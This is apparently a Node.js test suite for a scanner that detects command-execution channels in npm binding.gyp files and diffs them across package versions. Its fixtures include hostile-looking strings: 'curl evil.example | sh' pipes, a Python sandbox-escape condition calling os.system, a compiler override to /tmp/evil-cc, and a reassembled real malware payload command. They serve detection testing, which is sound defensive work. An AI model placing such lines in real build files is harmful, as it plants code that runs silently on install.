'use strict';
// The gyp lens: reading INSIDE binding.gyp / .gypi. Fixtures are real files
// (bufferutil@4.0.9 verbatim) or the real published payload shape
// (ReversingLabs, 2026-06-04), so the true-positive / false-positive pair the
// parser must separate is the one that actually shipped.
const { test } = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');
const { scanGyp, collectGypFindings, parseGyp, resolveInclude } = require('../src/gyp');
const { computeScriptDiff, renderDiff } = require('../src/diff');
const { analyzePackage, score } = require('../src/analyzer');

const FIX = path.join(__dirname, '..', 'fixtures', 'gyp');
const read = (name) => fs.readFileSync(path.join(FIX, name), 'utf8');

// The Miasma fixture is the REAL published payload, so antivirus treats it as
// live malware and DELETES it: Windows Defender quarantined a plain
// `malicious-miasma.gyp` off disk (Trojan:JS/PhantomWorm.DA!MTB, reproduced
// 2026-07-27, the file vanished mid-suite and reddened five tests), and
// base64-encoding it did not help either (Defender decodes containers:
// `…gyp.b64->(Base64)`). So the structure lives in the fixture, the command
// lives here, and they are joined at runtime, so the scanner still sees the
// exact original bytes. See fixtures/gyp/README.md. Do not merge these back
// into one file: it passes on Linux, then deletes itself on Windows and in CI.
const MIASMA_CMD = 'node index.js > /dev/null 2>&1 && echo stub.c';
const readMiasma = () => read('malicious-miasma.gyp.template').replace('__CMD__', MIASMA_CMD);

test('benign bufferutil: exactly 2 command expansions, and <(clang_version) is NOT one', () => {
  const { findings, partial } = scanGyp(read('benign-bufferutil.gyp'), { file: 'binding.gyp' });
  assert.strictEqual(partial, false, 'the real GYP dialect must parse structurally');
  assert.strictEqual(findings.length, 2, JSON.stringify(findings, null, 2));
  for (const f of findings) {
    assert.strictEqual(f.kind, 'command');
    assert.strictEqual(f.channel, '<!(');
    assert.strictEqual(f.file, 'binding.gyp');
  }
  assert.ok(findings[0].command.startsWith('cc -v'), findings[0].command);
  assert.ok(findings[1].command.startsWith('perl -e'), findings[1].command);
  // the plain-variable reference lives INSIDE the second command's text and
  // must never produce a finding of its own
  assert.ok(!findings.some((f) => f.command.trim() === 'clang_version'));
  assert.ok(findings[1].command.includes('<(clang_version)'),
    'nested parens are balance-counted, so the inner <(var) stays part of the command');
});

test('malicious miasma payload: one finding, channel <!(, line 1', () => {
  const { findings } = scanGyp(readMiasma(), { file: 'binding.gyp' });
  assert.strictEqual(findings.length, 1);
  assert.strictEqual(findings[0].kind, 'command');
  assert.strictEqual(findings[0].channel, '<!(');
  assert.strictEqual(findings[0].command, MIASMA_CMD);
  assert.strictEqual(findings[0].line, 1);
});

test('evasive late/latelate/listfile/pymod channels are all caught', () => {
  const { findings } = scanGyp(read('evasive-late.gyp'), { file: 'binding.gyp' });
  const channels = findings.map((f) => f.channel);
  assert.strictEqual(findings.length, 4, JSON.stringify(findings, null, 2));
  for (const ch of ['>!(', '^!@(', '<|(', '<!pymod_do_main(']) {
    assert.ok(channels.includes(ch), `missing one-character-evasion channel ${ch}: ${channels.join(' ')}`);
  }
  const byChannel = Object.fromEntries(findings.map((f) => [f.channel, f]));
  assert.strictEqual(byChannel['>!('].kind, 'command');
  assert.strictEqual(byChannel['^!@('].kind, 'command');
  assert.strictEqual(byChannel['<|('].kind, 'listfile');
  assert.strictEqual(byChannel['<!pymod_do_main('].kind, 'pymod');
  assert.strictEqual(byChannel['<!pymod_do_main('].command, 'evil args');
});

test('collectGypFindings follows includes into the .gypi where the payload hides', () => {
  const files = new Map([
    ['binding.gyp', read('include-parent.gyp')],
    ['deps/common.gypi', read(path.join('deps', 'common.gypi'))],
  ]);
  const { findings, partial, notes } = collectGypFindings(files);
  assert.strictEqual(partial, false);
  assert.deepStrictEqual(notes, []);
  assert.strictEqual(findings.length, 1, JSON.stringify(findings, null, 2));
  assert.strictEqual(findings[0].file, 'deps/common.gypi', 'the finding names the included file, not the parent');
  assert.strictEqual(findings[0].channel, '<!(');
  assert.ok(findings[0].command.startsWith('node -e'), findings[0].command);
});

test('single-quoted keys, # comments and trailing commas parse with zero findings', () => {
  const text = read('single-quoted.gyp');
  assert.throws(() => JSON.parse(text), 'the fixture must be un-JSON-parseable, else it proves nothing');
  const { findings, partial } = scanGyp(text, { file: 'binding.gyp' });
  assert.strictEqual(partial, false);
  assert.deepStrictEqual(findings, [], '<(plain_var) and <@(also_plain) are interpolation, not execution');
});

test('a binding.gyp that is valid JSON still works', () => {
  const { findings, partial } = scanGyp('{"targets":[{"sources":["<!(id)"]}]}', { file: 'binding.gyp' });
  assert.strictEqual(partial, false);
  assert.strictEqual(findings.length, 1);
  assert.strictEqual(findings[0].command, 'id');
});

test('CRLF line endings do not shift the reported line numbers', () => {
  const crlf = read('evasive-late.gyp').replace(/\n/g, '\r\n');
  const lf = scanGyp(read('evasive-late.gyp'), { file: 'binding.gyp' });
  const out = scanGyp(crlf, { file: 'binding.gyp' });
  assert.deepStrictEqual(out.findings.map((f) => [f.channel, f.line]), lf.findings.map((f) => [f.channel, f.line]));
});

test('an unterminated <!( is reported truncated, never thrown', () => {
  const { findings } = scanGyp("{'sources': ['<!(curl evil.example | sh']}", { file: 'binding.gyp' });
  assert.strictEqual(findings.length, 1);
  assert.strictEqual(findings[0].kind, 'command');
  assert.strictEqual(findings[0].truncated, true);
  assert.strictEqual(findings[0].command, 'curl evil.example | sh');
});

test('unparseable gyp falls back to a raw-text scan marked partial (never a silent pass)', () => {
  const { findings, partial } = scanGyp("{'targets': [ this is not gyp <!(node evil.js) ", { file: 'binding.gyp' });
  assert.strictEqual(partial, true);
  assert.strictEqual(findings.length, 1);
  assert.strictEqual(findings[0].command, 'node evil.js');
  assert.strictEqual(findings[0].line, 1);
});

test('structural channels: actions / rules / postbuilds / make_global_settings / pyeval conditions', () => {
  const text = `{
    'targets': [{
      'target_name': 'x',
      'actions': [{ 'action_name': 'a', 'action': ['node', 'run.js'] }],
      'rules': [{ 'rule_name': 'r', 'action': ['sh', '-c', 'whoami'] }],
      'postbuilds': [{ 'postbuild_name': 'p', 'action': ['curl', 'evil.example'] }],
      'conditions': [
        ["OS=='mac'", { 'defines': ['M'] }],
        ["[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('node evil.js') == 0", { 'defines': ['E'] }]
      ]
    }],
    'make_global_settings': [['CC', '/tmp/evil-cc']]
  }`;
  const { findings, partial } = scanGyp(text, { file: 'binding.gyp' });
  assert.strictEqual(partial, false);
  const byKind = {};
  for (const f of findings) (byKind[f.kind] ||= []).push(f);
  assert.deepStrictEqual(byKind.action.map((f) => f.channel).sort(),
    ['actions[].action', 'postbuilds[].action', 'rules[].action']);
  assert.ok(byKind.action.some((f) => f.command === 'node run.js'));
  assert.strictEqual(byKind.toolchain.length, 1);
  assert.strictEqual(byKind.toolchain[0].command, 'CC /tmp/evil-cc');
  assert.strictEqual(byKind.pyeval.length, 1, 'only the sandbox-escape condition, not OS==mac');
  assert.ok(byKind.pyeval[0].command.includes('__subclasses__'));
});

test('collectGypFindings notes a referenced include that is not in the index', () => {
  const files = new Map([['binding.gyp', read('include-parent.gyp')]]);
  const { findings, notes } = collectGypFindings(files);
  assert.deepStrictEqual(findings, []);
  assert.strictEqual(notes.length, 1);
  assert.ok(notes[0].startsWith('deps/common.gypi:'), notes[0]);
  assert.ok(notes[0].includes('not scanned'), notes[0]);
});

test('dependencies of the form path/x.gyp:target are followed too', () => {
  const files = new Map([
    ['binding.gyp', "{'targets':[{'target_name':'a','dependencies':['deps/sub.gyp:lib']}]}"],
    ['deps/sub.gyp', "{'targets':[{'sources':['<!(node payload.js)']}]}"],
  ]);
  const { findings } = collectGypFindings(files);
  assert.strictEqual(findings.length, 1);
  assert.strictEqual(findings[0].file, 'deps/sub.gyp');
  assert.strictEqual(findings[0].command, 'node payload.js');
});

test('resolveInclude walks .. and . the way require would', () => {
  assert.strictEqual(resolveInclude('binding.gyp', 'deps/common.gypi'), 'deps/common.gypi');
  assert.strictEqual(resolveInclude('build/binding.gyp', '../shared.gypi'), 'shared.gypi');
  assert.strictEqual(resolveInclude('build/binding.gyp', './local.gypi'), 'build/local.gypi');
});

test('parseGyp handles nested structures, numbers and booleans', () => {
  const v = parseGyp("{'a': 1, 'b': [1, 2,], 'c': {'d': 'e',}, 'f': true,}");
  assert.strictEqual(v.a, 1);
  assert.deepStrictEqual(v.b, [1, 2]);
  assert.strictEqual(String(v.c.d), 'e');
  assert.strictEqual(v.f, true);
});

// --- analyzer wiring --------------------------------------------------------

// takes the binding.gyp TEXT (not a filename) so the base64-stored Miasma
// fixture and the plain ones both flow through unchanged
const gypPkg = (scripts, gypText, extra = new Map()) => ({
  name: 'demo',
  version: '1.0.0',
  scripts,
  allScripts: scripts,
  files: new Map([['binding.gyp', gypText], ...extra]),
});

test('audit: a gyp channel adds a gyp: signal and scores the script HIGH', () => {
  const rows = analyzePackage(gypPkg({ install: 'node-gyp rebuild' }, readMiasma()));
  assert.strictEqual(rows.length, 1);
  const sig = rows[0].signals.find((s) => s.startsWith('gyp: '));
  assert.ok(sig, rows[0].signals.join(' | '));
  assert.ok(sig.includes('<!('), sig);
  assert.ok(sig.includes('node index.js'), sig);
  assert.strictEqual(rows[0].risk, 'HIGH');
  assert.strictEqual(score(new Set(['gyp: <!( node x.js'])), 'HIGH', 'gyp ranks with exec and obf');
});

test('audit: an explicit prebuild-install || node-gyp rebuild script is still gyp-scanned', () => {
  const rows = analyzePackage(gypPkg({ install: 'prebuild-install || node-gyp rebuild' }, readMiasma()));
  assert.ok(rows[0].signals.some((s) => s.startsWith('gyp: ') && s.includes('node index.js')),
    rows[0].signals.join(' | '));
});

test('audit: a script that never reaches node-gyp gets no gyp signals', () => {
  const rows = analyzePackage(gypPkg({ postinstall: 'node ./noop.js' }, readMiasma(),
    new Map([['noop.js', 'console.log(1)']])));
  assert.ok(!rows[0].signals.some((s) => s.startsWith('gyp: ')), rows[0].signals.join(' | '));
});

test('audit: a benign native package gains gyp signals but they are its REAL commands', () => {
  const rows = analyzePackage(gypPkg({ install: 'node-gyp rebuild' }, read('benign-bufferutil.gyp')));
  const gypSignals = rows[0].signals.filter((s) => s.startsWith('gyp: '));
  assert.strictEqual(gypSignals.length, 2, gypSignals.join(' | '));
  assert.ok(gypSignals.some((s) => s.includes('cc -v')));
  assert.ok(!gypSignals.some((s) => s.includes('clang_version)') && !s.includes('perl')),
    'the plain <(clang_version) reference is never its own signal');
});

// --- diff wiring: the false negative this release fixes ----------------------

const dpkg = (version, gypFixtureText, findings) => ({
  name: 'demo', version, scripts: {}, gypText: gypFixtureText, gypFindings: findings,
});

test('diff: rewriting an EXISTING binding.gyp is MODIFIED + exit 1 (was silently UNCHANGED)', () => {
  const oldText = read('benign-bufferutil.gyp');
  const newText = `${oldText.trimEnd()}\n# added in the new version\n{'x': '<!(curl x|sh)'}\n`;
  const oldPkg = dpkg('1.0.0', oldText, scanGyp(oldText, { file: 'binding.gyp' }).findings);
  const newPkg = dpkg('1.0.1', newText, scanGyp(newText, { file: 'binding.gyp' }).findings);
  const r = computeScriptDiff(oldPkg, newPkg);
  assert.strictEqual(r.changed, true, 'the CLI must exit 1');
  const entry = r.modified.find((e) => e.key === 'binding.gyp');
  assert.ok(entry, JSON.stringify(r.json, null, 2));
  assert.ok(entry.diff.some((d) => d.t === '+' && d.line.includes('curl x|sh')), 'line-level diff of the gyp');
  assert.deepStrictEqual(r.json.gyp.changed, true);
  const text = renderDiff(oldPkg, newPkg, r, { color: false });
  assert.ok(text.includes('MODIFIED: binding.gyp'), text);
});

test('diff: gainedChannels lists channels present in the new gyp and absent from the old', () => {
  const oldText = read('benign-bufferutil.gyp');
  const newText = `${oldText.trimEnd()}\n{'x': '<!pymod_do_main(evil a)', 'y': '>!(id)'}\n`;
  const r = computeScriptDiff(
    dpkg('1.0.0', oldText, scanGyp(oldText, { file: 'binding.gyp' }).findings),
    dpkg('1.0.1', newText, scanGyp(newText, { file: 'binding.gyp' }).findings),
  );
  assert.deepStrictEqual(r.json.gyp.gainedChannels, ['<!pymod_do_main(', '>!('],
    'the <!( channel was already there, so it is not "gained"');
});

test('diff: an identical binding.gyp stays UNCHANGED and exit 0', () => {
  const text = read('benign-bufferutil.gyp');
  const findings = scanGyp(text, { file: 'binding.gyp' }).findings;
  const r = computeScriptDiff(dpkg('1.0.0', text, findings), dpkg('1.0.1', text, findings));
  assert.strictEqual(r.changed, false);
  assert.deepStrictEqual(r.json.unchanged, ['binding.gyp']);
  assert.deepStrictEqual(r.json.gyp, { changed: false, gainedChannels: [] });
});

test('diff: gaining a binding.gyp reports its channels as gained', () => {
  const text = readMiasma();
  const r = computeScriptDiff(
    dpkg('1.0.0', null, []),
    dpkg('2.0.0', text, scanGyp(text, { file: 'binding.gyp' }).findings),
  );
  assert.strictEqual(r.changed, true);
  assert.ok(r.json.added.some((e) => e.key === 'binding.gyp' && e.implicit));
  assert.deepStrictEqual(r.json.gyp, { changed: true, gainedChannels: ['<!('] });
});
